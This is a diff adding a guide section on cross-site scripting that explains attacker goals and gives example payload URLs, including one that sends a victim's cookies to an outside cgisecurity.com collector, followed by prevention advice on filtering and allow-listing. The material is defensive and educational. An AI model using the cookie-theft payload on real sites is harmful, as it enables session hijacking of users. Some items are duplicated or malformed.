@@ -1,0 +1,61 @@
+
+
+XSS Introduction
+XSS attacks occur when a user enters malicious data in a Web site. For example, a user can post a message to a newsgroup that contains malicious code. When another person views this message, the browser will interpret the code and execute it, potentially giving the attacker complete control of the system.
+
+
+Why do XSS attacks
+•	To hijack active accounts/sessions.
+•	To changing user settings
+•	To perform cookie theft / poisoning
+•	To perform False Advertising
+•	To perform auto attacking
+•	To generating informational error messages.
+
+
+Examples of XSS Attacks
+To test for XSS attacks	http://localhost/tanda.asp?chits=<script>alert(‘Test’)<script>
+To pop up the current cookies of the user	http://localhost/tanda.asp?chits=<script>alert(document.cookie)
+<script>
+To mail the cookies to a particular location when the user clicks on the link	http://localhost/a.php?variable="><script>
+document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi? '%20+document.cookie</script>
+Table 11: Few recently discovered web related XSS vulnerabilities.
+
+Automated XSS Tools 
+It is very difficult to detect the possibility of cross site scripting attacks on the application. One of the best tools that has this functionality to a limited extent is Nikto (already discuss above). But even Nikto is not very accurate. The best way to look for the possibility of XSS attacks is see how the application handles “<” and “>” for each variable. 
+
+Preventing cross site scripting attacks
+The following general approaches for preventing cross-site scripting attacks are presented here: 
+
+1.	One solution is to not allow HTML from un-trusted users. If the users are trusted, then HTML is fine.  Otherwise, look for alternate solutions. 
+
+a.	Create your own XML DTD and translate it to HTML.  If the document does not conform, it can be rejected with a validating parser, or the nonconforming data can be skipped.  The way the application has limited number of insertion points for active content which can only be attacked a limited number of ways, which can fairly easily be check for.  
+
+b.	Parse the HTML into a DOM tree or similar format, like with perl's HTML::Parser or similar, and reconstruct a clean version from that. It may not catch every possible case, but at least it shouldn't be tricked by strangely constructed HTML very often, as regex and other similar approaches often are.
+
+c.	Have the application moderate the input.  Convert all input data into raw text format and verify the fact that it is not dangerous.
+
+2.	IE6+ implements IFRAME tags. There is a security attribute which can be used to disable JavaScript, and makes XSS attacks harder. Docs are at 
+http://msdn.microsoft.com/workshop/author/dhtml/reference/properties/security.asp
+
+3.	Change all <> to the quivalent pair &lt;&gt; and then use regular expressions to catch &lt;tag&gt; content &lt;/tag&gt; and exchange to <tag>contenet</tag> to let only permitted tags to go through the filter. Good filter design docs at http://www.owasp.org/filters/ 
+
+4.	Still another solution might be to not parse every tag & only output a restrictive set. After that, filtering out content between <script*></script> including the tags themselves is a good place to start. You'll also want to filter 
+a.	- <embed*>, <object*>, <iframe*>, <applet*>
+b.	- Remove the on* attribute from every tag. Examples: <img onClick=...>, <<body onLoad=...>
+c.	- Remove <meta> tags with an http-equiv attribute of "Refresh" or "Location".
+
+5.	From a security point of view, white listing is preferred over black listing (use of filters). Instead of removing what you know is bad, you should let through what you know is good (and drop the unknown). Besides black listing introduces a lot of unnecessary overhead and it's hard to tell what's dangerous and what isn't (e.g. in an A HREF tag). The safer way might be to only allow the most trivial tags like <B>, <I> etc. and replace all remaining &, <, > with &amp;, &lt; and &gt;.
+
+6.	Other general recommendations include 
+a.	Create HTML TAG ALLOW lists. (Only allow certain safe HTML tags)
+b.	Create HTML ATTRIBUTE ALLOW lists. (Only allow certain safe HTML Attributes)
+c.	Filter any input JavaScript/Java/VBScript/ActiveX/Flash Related.
+d.	Host HTML user input on an alternate domain. (acme.net instead of .com)
+e.	Double and Single quotes should be filtered
+f.	Remove all Null Characters
+g.	Filter HTML enabling characters
+h.	Double and Single quotes should be filtered
+i.	Ensure all allowed tags and attributes are safe and limited.
+j.	Double and Single quotes should be filtered
+
